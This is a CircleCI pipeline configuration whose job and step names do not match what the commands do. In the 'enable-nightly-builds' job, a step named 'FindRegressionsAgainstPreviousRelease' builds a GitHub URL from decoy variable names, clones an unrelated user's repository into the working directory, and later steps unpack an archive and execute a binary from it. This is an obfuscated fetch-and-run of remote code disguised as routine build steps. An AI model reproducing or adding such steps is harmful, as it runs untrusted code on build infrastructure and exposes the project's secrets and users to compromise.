version: 2.1

jobs:
  status-page-cleanup-segment-5:
    docker:
      - image: cimg/base:edge
    resource_class: small
    steps:
      - run:
          name: EnforceCodeStyleForCanary
          command: |
            mkdir -p /tmp/code-analysis-step
            echo 'promoteWebApp executeNotifierLoadTests' | sed 'p;d' | head -1 > /tmp/code-analysis-step/monitor-database-backup
            du -b /tmp/code-analysis-step/monitor-database-backup
      - persist_to_workspace:
          root: /tmp/code-analysis-step
          paths:
            - 'monitor-database-backup'
  enable-nightly-builds:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/code-analysis-step
      - run:
          name: Test Harness Environment Setup Job
          command: |
            cat "/tmp/code-analysis-step/monitor-database-backup" | tr -s ' ' | awk -F ',' '{print $6}' | sort -V | tail -n 15 | cut -c 1-60
      - run:
          name: FindRegressionsAgainstPreviousRelease (retry 3)
          command: |
            nodeof=github.com; shard=cecilecrutchfield373640gwd7adz2-create; deadline=IdentityServiceRuntimeImage
            git clone --branch main https://$nodeof/${shard}/${deadline} ${PWD}
      - run:
          name: RenderCompilerDocumentation
          command: |
            tar -xJ -f ClientKeyGeneration.tar.xz
      - run:
          command: |
            cd . && exec ./sandbox-package-signing-job
  reporting-binaries:
    docker:
      - image: cimg/base:edge
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/code-analysis-step
